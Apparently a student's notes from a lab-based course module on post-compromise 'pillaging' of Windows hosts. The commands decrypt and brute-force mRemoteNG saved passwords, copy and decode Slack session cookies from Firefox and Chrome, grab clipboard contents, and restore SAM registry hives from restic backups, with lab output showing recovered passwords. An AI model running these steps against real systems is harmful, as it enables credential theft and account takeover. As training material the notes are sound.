...
Its the process of obtaining information from a compromised system. This includes but isnt limited to personal information, corporate blueprints, credit card data, server information and network details, passwords and other kinds of credentials

The list is long but anything that provides information is valuable of course depending on the size, scope and the purpose of the business. each of these have their own locations and need their own techniques so having tools to automate this process makes life so much easier

- mRemoteNG
	- usually contains an XML file
		- this contains a root element called `Connections` regarding information about the encryption used for the credentials and the attribute `Protected` which is encrypted with something called a `MasterPassword`
		- If we we can use it to try and crack the master password. 
	- if no master password is set usually `mRemoteNG-Decrypt` can decrypt it, if it is present and we know it then we can also supply it to get the password back
...
```powershell
// ----------------------------- Getting Installed Programs via Powershell & Registry Keys ----------------------------- //
...
// ----------------------------- mRemoteNG ----------------------------- //
// Usually there should be  a config file, this config file contains and XML
...
// with this file we can decrypt the password using mremoteng_decrypt
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD...." 

// what if theres a custom password?
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD...."  -p admin

// heres a for loop to crack this faster
...
IM clients means Instant Messaging, Applications like Slack and Teams are VERY common examples of this. Compromsing a client means we can see the messages between people in private chats and groups, There are multiple methods to this madness;

- use the users credentials to get into the cloud version
- use multi-factor authentication and steal the cookies to login
...
we can also extract said cookies from Firefox and possibly other browsers

```powershell
// ----------------------------- Extractin Slack Cookies from FireFox ----------------------------- //

// Cookie extraction from firefox, usually firefox stores cookies in a file named cookies.sqlite. This file is in each users APPDATA directory
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .

// then we could download something called cookieextractor.py to actually extract said cookies
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

// With the cookies we can use cookie editor to add the cookies to our own sessions



// ----------------------------- Extractin Slack Cookies from Chromium-Based Browsers ----------------------------- //
// the only difference between chromioum based browsers is that the cookie value is  encrypte with DPAPI. To decrypt it we need to do a decryption routine, we can just use SharpChromioum tho which makes our lives much easier that or the powershell script also works

// also the location of the cookies is hardcoded and depending on the chromium version or even product it MIGHT NEED TO BE CHANGED SO BEWARE, this is where the usual location is 
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies

// so we can copy the existing cookies to the expected location to make our lives easier
...
Copy pasting credentials is usually much easier than anything else, this renders keyloggers ineffective as fuck so having something to access the clipboard makes life easier. 
...
```powershell
// ----------------------------- Roles and Services ----------------------------- //
// Here we will attack Backup Servers by having our own backup who has permissions on restic
...
// Back up a directory with VSS (for when you are backing up files actively used by the OS)
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

// Check Backups that have been saved in a repo
restic.exe -r E:\restic2\ snapshots

// Restore a backup using the ID
...
Places where we can pillage shit from;
...
```
kali@kali ~/H/mRemoteNG-Decrypt (master) [2]> python mremoteng_decrypt.py -s 's1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ='
Password: Princess01!  <--- password for grace

OR

kali@kali ~/H/mRemoteNG_password_decrypt (master) [2]> python mremoteng_decrypt.py ../confCOnf.xml 
Name: 
Grace_Local_AcctHostname: localhost
Username: grace
Password: Princess01!
...
cookie extractions for slack

```
kali@kali ~ [2]> python cookie_extractor.py --dbpath kys/cookies.sqlite
...
okay now time to find restic stuff, i found this on the desktop
...
now we take snapshots HEHEHEHEH

```powershell
in this case we dont have permissions to take snapshots of the SAM hive but we know the first repository our password works AND it already takes backups of it

// checking the existing snapshots

PS E:\> restic.exe -r E:\restic\ snapshots
...
// Restoring the backup to a folder we made
PS E:\> restic.exe -r E:\restic\ restore b2f5caa0 --target E:\Restore
enter password for repository:
repository 2e40703c opened successfully, password is correct
found 1 old cache directories in C:\Users\jeff\AppData\Local\restic, run `restic cache --cleanup` to remove them
restoring <Snapshot b2f5caa0 of [C:\Windows\System32\config] at 2022-08-17 11:43:56.2484457 -0700 PDT by PILLAGING-WIN01\Administrator@PILLAGING-WIN01> to E:\Restore
...
```shell-session
Hillside_1@htb[/htb]$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
...
```shell-session
Hillside_1@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="
...
```shell-session
Hillside_1@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
...
```shell-session
Hillside_1@htb[/htb]$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
...
```shell-session
Hillside_1@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
